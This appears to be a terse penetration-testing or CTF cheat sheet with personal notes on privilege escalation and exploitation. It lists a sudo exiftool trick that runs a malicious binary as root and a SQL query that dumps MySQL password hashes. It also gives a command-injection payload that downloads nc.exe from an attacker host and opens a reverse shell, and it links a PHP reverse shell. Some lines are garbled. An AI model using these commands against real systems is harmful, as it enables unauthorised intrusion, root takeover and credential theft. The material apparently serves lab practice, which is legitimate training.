* Check these for privesc! :
$ sudo -l
$ uname -a
$ linpeas

* if you founf more domain or ip addresses, add to dns -> /etc/hosts

* Don't forget to:
$ hostname && whoami && cat /root/proof.txt && ip aRETAC AD:

* maybe you found bug of sql
query: select user, authentication_string from user;

[gtfobins](https://gtfobins.github.io/) -> for binary exploit
sample: 
create malicious binary(app) (#!/bin/bash enter bash) then:
chmod +x binary
sudo /usr/local/bin/exiftool -filename=/usr/bin/app (binary path)
sudo /usr/bin/app

* path traversal vuln:
../../../../../../../../...................

* command injection vuln:
powershell -c iwr http://ipkali/nc.exe -OutFile \windows\temp\nc.exe;windows\temp\nc.exe -nv ipkali 443 -e cmd

* generate reverse shell
https://github.com/pentestmonkey/php-reverse-shell
